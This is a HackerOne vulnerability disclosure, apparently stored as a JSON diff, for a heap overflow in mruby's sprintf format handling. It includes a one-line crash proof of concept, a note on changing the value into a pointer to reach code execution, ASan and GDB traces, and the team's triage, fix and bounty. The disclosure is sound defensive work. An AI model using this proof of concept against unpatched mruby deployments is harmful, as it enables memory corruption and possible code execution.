@@ -1,0 +1,282 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "eveeez", 
+        "mpz", 
+        "rbcafe", 
+        "spetr0x"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "100.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 192318, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-01-11T21:48:30.052Z", 
+    "vulnerability_information": "Description:\n====================\n**mrb_vformat** is responsible to parse string format like 'printf' in C, the code doesn't check the number given between '%' and '$' .\n **mrb_fixnum_to_str()** is called by **join_ary** and converts the given number from string into integer, this could lead to overwrite and fully control mbr_value object.\n\nPOC\n====================\nThe poc is fairly simple an could be triggered from many different place, here is the trivial one :\n```\n'%A%1094861636$'%2\n```\nExploitability:\n====================\nThe value 1094861636 can be changed with any memory pointer address and overwrite mbr_value objects, so there a very high possibility to make a code execution by crafting and grooming the heap and make the pointer to be written in a predicted place.\n\n\nHere is some debug analysis :\n```\nsimo@vlab64:~/sources/mruby/bin% ./mruby_asan < CRASH.rb\n=================================================================\n==78222==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000004a7d at pc 0x000000524919 bp 0x7fffffffca20 sp 0x7fffffffca18\nREAD of size 8 at 0x603000004a7d thread T0\n    #0 0x524918 in mrb_obj_respond_to /home/simo/sources/mruby_libF/src/class.c:1533:25\n    #1 0x524918 in mrb_respond_to /home/simo/sources/mruby_libF/src/class.c:1554\n    #2 0x54c00e in convert_type /home/simo/sources/mruby_libF/src/object.c:314:8\n    #3 0x54c00e in mrb_check_convert_type /home/simo/sources/mruby_libF/src/object.c:356\n    #4 0x50efad in join_ary /home/simo/sources/mruby_libF/src/array.c:1030:13\n    #5 0x50eaf5 in mrb_ary_join /home/simo/sources/mruby_libF/src/array.c:1054:10\n    #6 0x61c5c2 in mrb_raisef /home/simo/sources/mruby_libF/src/error.c:371:10\n    #7 0x664ea8 in check_pos_arg /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c\n    #8 0x663264 in mrb_str_format /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:655:9\n    #9 0x65da7d in mrb_f_sprintf /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:514:12\n    #10 0x557e7d in mrb_vm_exec /home/simo/sources/mruby_libF/src/vm.c:1171:18\n    #11 0x56b136 in mrb_top_run /home/simo/sources/mruby_libF/src/vm.c:2487:12\n    #12 0x5e9629 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #13 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #14 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291\n    #15 0x41a108 in _start (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x41a108)\n\n0x603000004a7d is located 3 bytes to the left of 30-byte region [0x603000004a80,0x603000004a9e)\nallocated by thread T0 here:\n    #0 0x4c0b4e in realloc (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x4c0b4e)\n    #1 0x4fc26d in mrb_realloc_simple /home/simo/sources/mruby_libF/src/gc.c:201:8\n    #2 0x65c4cc in codegen_realloc /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:131:7\n    #3 0x65c4cc in scope_finish /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2832\n    #4 0x65084a in scope_body /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:746:3\n    #5 0x62aabc in codegen /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:1548:5\n    #6 0x6292e2 in mrb_generate_code /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2950:5\n    #7 0x5e91c7 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5732:10\n    #8 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #9 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/simo/sources/mruby_libF/src/class.c:1533:25 in mrb_obj_respond_to\n```\n\nGDB output :\n```\n(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/simo/sources/mruby/bin/fuzz_mruby/mruby < crash2.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50\n50          return mrb_obj_ptr(v)->c;\n(gdb) x/2i $pc\n=> 0x40b44b <mrb_class+151>:    mov    rax,QWORD PTR [rax+0x8]\n   0x40b44f <mrb_class+155>:    pop    rbp\n(gdb) x/xg $rax\n0x141424344:    Cannot access memory at address 0x141424344\n(gdb) bt\n#0  0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50\n#1  0x0000000000410b03 in mrb_respond_to (mrb=0x6af010, obj=..., mid=144) at /home/simo/sources/patch/mruby/src/class.c:1554\n#2  0x000000000041c5ac in convert_type (mrb=0x6af010, val=..., tname=0x46f9c6 \"String\", method=0x46f9bf \"to_str\", raise=0 '\\000') at /home/simo/sources/patch/mruby/src/object.c:314\n#3  0x000000000041c85e in mrb_check_convert_type (mrb=0x6af010, val=..., type=MRB_TT_STRING, tname=0x46f9c6 \"String\", method=0x46f9bf \"to_str\") at /home/simo/sources/patch/mruby/src/object.c:356\n#4  0x000000000042f05f in mrb_check_string_type (mrb=0x6af010, str=...) at /home/simo/sources/patch/mruby/src/string.c:1729\n#5  0x000000000040ab4c in join_ary (mrb=0x6af010, ary=..., sep=..., list=...) at /home/simo/sources/patch/mruby/src/array.c:1030\n#6  0x000000000040ac94 in mrb_ary_join (mrb=0x6af010, ary=..., sep=...) at /home/simo/sources/patch/mruby/src/array.c:1054\n#7  0x000000000044bc23 in mrb_vformat (mrb=0x6af010, format=0x49d208 \"numbered(%S) after unnumbered(%S)\", ap=0x7fffffffd610) at /home/simo/sources/patch/mruby/src/error.c:347\n#8  0x000000000044bdd3 in mrb_raisef (mrb=0x6af010, c=0x6b6650, fmt=0x49d208 \"numbered(%S) after unnumbered(%S)\") at /home/simo/sources/patch/mruby/src/error.c:371\n#9  0x000000000045c410 in check_pos_arg (mrb=0x6af010, posarg=1, n=1094861636) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:158\n#10 0x000000000045cf6e in mrb_str_format (mrb=0x6af010, argc=2, argv=0x6c1e60, fmt=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:620\n#11 0x000000000045c748 in mrb_f_sprintf (mrb=0x6af010, obj=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:514\n#12 0x0000000000421126 in mrb_vm_exec (mrb=0x6af010, proc=0x6b3fb0, pc=0x48ca78 <gem_mrblib_irep_mruby_sprintf+208>) at /home/simo/sources/patch/mruby/src/vm.c:1171\n#13 0x000000000041f63b in mrb_vm_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:772\n#14 0x000000000042766b in mrb_top_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:2487\n#15 0x0000000000447e56 in mrb_load_exec (mrb=0x6af010, p=0x70b080, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#16 0x0000000000447eec in mrb_load_file_cxt (mrb=0x6af010, f=0x7ffff7ac88e0 <_IO_2_1_stdin_>, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#17 0x000000000040238e in main (argc=1, argv=0x7fffffffe4a8) at /home/simo/sources/patch/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb)\n```\n\nUnfortunately I couldn't write a reliable patch for this for lack of knowledge about mruby internals and investigating other security bugs which will be reported soon.\n\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "none", 
+        "author_type": "Team"
+    }, 
+    "title": "mrb_vformat() heap overflow could lead to code execution", 
+    "is_member_of_team?": null, 
+    "vote_count": 4, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-02-10T21:48:30.101Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$100", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-19T19:27:25.544Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-19T19:27:25.544Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We've reproduced the crash and opened an issue in the mruby repository: https://github.com/mruby/mruby/issues/3355\n\nIt appears that the bug is in mruby-sprintf, which is not included in mruby-engine, and therefore this bug likely does not affect mruby-engine.", 
+            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the crash and opened an issue in the mruby repository: <a title=\"https://github.com/mruby/mruby/issues/3355\" href=\"/redirect?signature=eb791c629f151a85b08acbd511a43b75eefd3762&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3355\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3355</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>It appears that the bug is in mruby-sprintf, which is not included in mruby-engine, and therefore this bug likely does not affect mruby-engine.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1374779, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-19T19:27:32.509Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-19T19:27:32.509Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "None", 
+                "old_severity": "High (8.1)"
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1374781, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mg36", 
+                "url": "/mg36"
+            }, 
+            "created_at": "2017-01-03T21:29:23.068Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-03T21:29:23.068Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks again for your report, and for helping improve MRuby. This issue has now been patched upstream. Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report, and for helping improve MRuby. This issue has now been patched upstream. Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1397375, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-01-11T21:48:25.796Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-11T21:48:25.796Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "mg36", 
+                "url": "/mg36"
+            }, 
+            "message": "Thanks for submitting this report!", 
+            "markdown_message": "<p>Thanks for submitting this report!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1414713, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-11T21:48:30.075Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-11T21:48:30.075Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1414714, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-10T21:48:31.111Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-10T21:48:31.111Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1478084, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "mg36", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/mg36", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 2, 
+        "name": "Memory Corruption - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -57372916.77844174, 
+    "disclosed_at": "2017-02-10T21:48:31.094Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/192318", 
+    "created_at": "2016-12-19T02:39:50.127Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h1 id=\"description\">Description:</h1>\n\n<p><strong>mrb_vformat</strong> is responsible to parse string format like &#39;printf&#39; in C, the code doesn&#39;t check the number given between &#39;%&#39; and &#39;$&#39; .<br>\n <strong>mrb_fixnum_to_str()</strong> is called by <strong>join_ary</strong> and converts the given number from string into integer, this could lead to overwrite and fully control mbr_value object.</p>\n\n<h1 id=\"poc\">POC</h1>\n\n<p>The poc is fairly simple an could be triggered from many different place, here is the trivial one :</p>\n<pre class=\"highlight plaintext\"><code>&#39;%A%1094861636$&#39;%2\n</code></pre>\n<h1 id=\"exploitability\">Exploitability:</h1>\n\n<p>The value 1094861636 can be changed with any memory pointer address and overwrite mbr_value objects, so there a very high possibility to make a code execution by crafting and grooming the heap and make the pointer to be written in a predicted place.</p>\n\n<p>Here is some debug analysis :</p>\n<pre class=\"highlight plaintext\"><code>simo@vlab64:~/sources/mruby/bin% ./mruby_asan &lt; CRASH.rb\n=================================================================\n==78222==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000004a7d at pc 0x000000524919 bp 0x7fffffffca20 sp 0x7fffffffca18\nREAD of size 8 at 0x603000004a7d thread T0\n    #0 0x524918 in mrb_obj_respond_to /home/simo/sources/mruby_libF/src/class.c:1533:25\n    #1 0x524918 in mrb_respond_to /home/simo/sources/mruby_libF/src/class.c:1554\n    #2 0x54c00e in convert_type /home/simo/sources/mruby_libF/src/object.c:314:8\n    #3 0x54c00e in mrb_check_convert_type /home/simo/sources/mruby_libF/src/object.c:356\n    #4 0x50efad in join_ary /home/simo/sources/mruby_libF/src/array.c:1030:13\n    #5 0x50eaf5 in mrb_ary_join /home/simo/sources/mruby_libF/src/array.c:1054:10\n    #6 0x61c5c2 in mrb_raisef /home/simo/sources/mruby_libF/src/error.c:371:10\n    #7 0x664ea8 in check_pos_arg /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c\n    #8 0x663264 in mrb_str_format /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:655:9\n    #9 0x65da7d in mrb_f_sprintf /home/simo/sources/mruby_libF/mrbgems/mruby-sprintf/src/sprintf.c:514:12\n    #10 0x557e7d in mrb_vm_exec /home/simo/sources/mruby_libF/src/vm.c:1171:18\n    #11 0x56b136 in mrb_top_run /home/simo/sources/mruby_libF/src/vm.c:2487:12\n    #12 0x5e9629 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #13 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #14 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291\n    #15 0x41a108 in _start (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x41a108)\n\n0x603000004a7d is located 3 bytes to the left of 30-byte region [0x603000004a80,0x603000004a9e)\nallocated by thread T0 here:\n    #0 0x4c0b4e in realloc (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x4c0b4e)\n    #1 0x4fc26d in mrb_realloc_simple /home/simo/sources/mruby_libF/src/gc.c:201:8\n    #2 0x65c4cc in codegen_realloc /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:131:7\n    #3 0x65c4cc in scope_finish /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2832\n    #4 0x65084a in scope_body /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:746:3\n    #5 0x62aabc in codegen /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:1548:5\n    #6 0x6292e2 in mrb_generate_code /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/codegen.c:2950:5\n    #7 0x5e91c7 in mrb_load_exec /home/simo/sources/mruby_libF/mrbgems/mruby-compiler/core/parse.y:5732:10\n    #8 0x4ed9f3 in main /home/simo/sources/mruby_libF/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #9 0x7ffff6ee682f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/simo/sources/mruby_libF/src/class.c:1533:25 in mrb_obj_respond_to\n</code></pre>\n<p>GDB output :</p>\n<pre class=\"highlight plaintext\"><code>(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/simo/sources/mruby/bin/fuzz_mruby/mruby &lt; crash2.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50\n50          return mrb_obj_ptr(v)-&gt;c;\n(gdb) x/2i $pc\n=&gt; 0x40b44b &lt;mrb_class+151&gt;:    mov    rax,QWORD PTR [rax+0x8]\n   0x40b44f &lt;mrb_class+155&gt;:    pop    rbp\n(gdb) x/xg $rax\n0x141424344:    Cannot access memory at address 0x141424344\n(gdb) bt\n#0  0x000000000040b44b in mrb_class (mrb=0x6af010, v=...) at /home/simo/sources/patch/mruby/include/mruby/class.h:50\n#1  0x0000000000410b03 in mrb_respond_to (mrb=0x6af010, obj=..., mid=144) at /home/simo/sources/patch/mruby/src/class.c:1554\n#2  0x000000000041c5ac in convert_type (mrb=0x6af010, val=..., tname=0x46f9c6 &quot;String&quot;, method=0x46f9bf &quot;to_str&quot;, raise=0 &#39;\\000&#39;) at /home/simo/sources/patch/mruby/src/object.c:314\n#3  0x000000000041c85e in mrb_check_convert_type (mrb=0x6af010, val=..., type=MRB_TT_STRING, tname=0x46f9c6 &quot;String&quot;, method=0x46f9bf &quot;to_str&quot;) at /home/simo/sources/patch/mruby/src/object.c:356\n#4  0x000000000042f05f in mrb_check_string_type (mrb=0x6af010, str=...) at /home/simo/sources/patch/mruby/src/string.c:1729\n#5  0x000000000040ab4c in join_ary (mrb=0x6af010, ary=..., sep=..., list=...) at /home/simo/sources/patch/mruby/src/array.c:1030\n#6  0x000000000040ac94 in mrb_ary_join (mrb=0x6af010, ary=..., sep=...) at /home/simo/sources/patch/mruby/src/array.c:1054\n#7  0x000000000044bc23 in mrb_vformat (mrb=0x6af010, format=0x49d208 &quot;numbered(%S) after unnumbered(%S)&quot;, ap=0x7fffffffd610) at /home/simo/sources/patch/mruby/src/error.c:347\n#8  0x000000000044bdd3 in mrb_raisef (mrb=0x6af010, c=0x6b6650, fmt=0x49d208 &quot;numbered(%S) after unnumbered(%S)&quot;) at /home/simo/sources/patch/mruby/src/error.c:371\n#9  0x000000000045c410 in check_pos_arg (mrb=0x6af010, posarg=1, n=1094861636) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:158\n#10 0x000000000045cf6e in mrb_str_format (mrb=0x6af010, argc=2, argv=0x6c1e60, fmt=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:620\n#11 0x000000000045c748 in mrb_f_sprintf (mrb=0x6af010, obj=...) at /home/simo/sources/patch/mruby/mrbgems/mruby-sprintf/src/sprintf.c:514\n#12 0x0000000000421126 in mrb_vm_exec (mrb=0x6af010, proc=0x6b3fb0, pc=0x48ca78 &lt;gem_mrblib_irep_mruby_sprintf+208&gt;) at /home/simo/sources/patch/mruby/src/vm.c:1171\n#13 0x000000000041f63b in mrb_vm_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:772\n#14 0x000000000042766b in mrb_top_run (mrb=0x6af010, proc=0x6b21e0, self=..., stack_keep=0) at /home/simo/sources/patch/mruby/src/vm.c:2487\n#15 0x0000000000447e56 in mrb_load_exec (mrb=0x6af010, p=0x70b080, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#16 0x0000000000447eec in mrb_load_file_cxt (mrb=0x6af010, f=0x7ffff7ac88e0 &lt;_IO_2_1_stdin_&gt;, c=0x709f30) at /home/simo/sources/patch/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#17 0x000000000040238e in main (argc=1, argv=0x7fffffffe4a8) at /home/simo/sources/patch/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb)\n</code></pre>\n<p>Unfortunately I couldn&#39;t write a reliable patch for this for lack of knowledge about mruby internals and investigating other security bugs which will be reported soon.</p>\n", 
+    "severity_rating": "none", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
